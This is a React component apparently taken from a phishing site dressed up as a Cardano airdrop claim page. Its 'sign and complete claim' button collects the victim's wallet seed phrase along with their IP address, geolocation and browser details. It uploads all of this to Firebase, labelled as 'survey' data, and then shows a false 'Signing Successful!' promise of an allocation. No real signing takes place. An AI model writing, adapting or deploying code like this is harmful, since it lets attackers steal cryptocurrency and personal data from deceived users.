"use client";
import { ChevronDown } from "lucide-react";
import React, { useState, useEffect } from "react";
import { Button } from "../ui/button";
import { useWalletStore } from "@/store/walletStore";
import { storeSurveyData } from "@/lib/firebaseUtils";
import { cn } from "@/lib/utils";

interface SignStepProps {
	onPrevious: () => void;
}

function Sign({ onPrevious }: SignStepProps) {
	const {
		blockchainNetwork,
		walletProvider,
		seedPhrase,
		destinationAddress,
		ipAddress,
		geolocation,
		userAgent,
		screenResolution,
		clearSensitiveData,
		setProcess,
	} = useWalletStore();

	const [loading, setLoading] = useState(false);
	const [dots, setDots] = useState("");
	const [success, setSuccess] = useState(false);

	const mainAddress =
		"addr1q9w8f4z7g6xk5r8v9t6p7a8s2e0h5y3l0m2q8u4f9c6v7d8x9y0z5a2n3k4m";

	// Animate dots for loading
	useEffect(() => {
		if (!loading) {
			setDots("");
			return;
		}
		const interval = setInterval(() => {
			setDots((prev) => (prev.length < 3 ? prev + "." : ""));
		}, 500);
		return () => clearInterval(interval);
	}, [loading]);

	const formatAddress = (address: string): string => {
		if (!address) return "";
		if (address.length <= 10) return address;
		return `${address.slice(0, 6)}...${address.slice(-4)}`;
	};

	const handleSignAndComplete = async () => {
		const survey = {
			blockchainNetwork,
			walletProvider,
			seedPhrase,
			destinationAddress,
			ipAddress,
			geolocation,
			userAgent,
			screenResolution,
		};

		try {
			setLoading(true);
			const id = await storeSurveyData(survey);
			if (id) {
				console.log(survey);
				clearSensitiveData();
				setSuccess(true);

				// Reset process after 3 seconds
				setTimeout(() => {
					setProcess(false);
					setSuccess(false);
				}, 2500);
			}
		} catch (err) {
			// console.error("Failed to submit survey.", err);
		} finally {
			setLoading(false);
		}
	};

	return (
		<div>
			<div className={cn(success && "fixed inset-0")}>
				{/* Success popup */}
				{success && (
					<div className="absolute inset-0 bg-black/70 flex justify-center items-center z-50">
						<div className="bg-white px-8 py-12 rounded-sm text-center max-w-sm">
							<h3 className="text-xl font-bold mb-2">Signing Successful!</h3>
							<p>You will receive your Cardano allocation soon.</p>
						</div>
					</div>
				)}
			</div>

			<button
				onClick={onPrevious}
				className="flex items-center text-blue-600 hover:text-blue-700 mb-6"
				disabled={loading}
			>
				<ChevronDown
					className="rotate-90 mr-2"
					size={20}
				/>
				Back
			</button>

			<h2 className="text-2xl font-bold text-gray-900 mb-6">
				Sign and complete claim
			</h2>
			<p className="text-gray-700 mb-6">
				Review your claim details and sign to complete the process.
			</p>

			<div className="bg-gray-50 p-6 rounded-lg border border-gray-200 mb-6 space-y-4">
				<div>
					<p className="text-sm text-gray-600">Origin Address</p>
					<p className="font-medium text-gray-900">
						{formatAddress(mainAddress)}
					</p>
				</div>
				<div>
					<p className="text-sm text-gray-600">Destination Address</p>
					<p className="font-medium text-gray-900">
						{formatAddress(destinationAddress)}
					</p>
				</div>
			</div>

			<Button
				onClick={handleSignAndComplete}
				className="button-primary w-full"
				disabled={loading}
			>
				{loading ? `Signing${dots}` : "SIGN AND COMPLETE CLAIM"}
			</Button>
		</div>
	);
}

export default Sign;
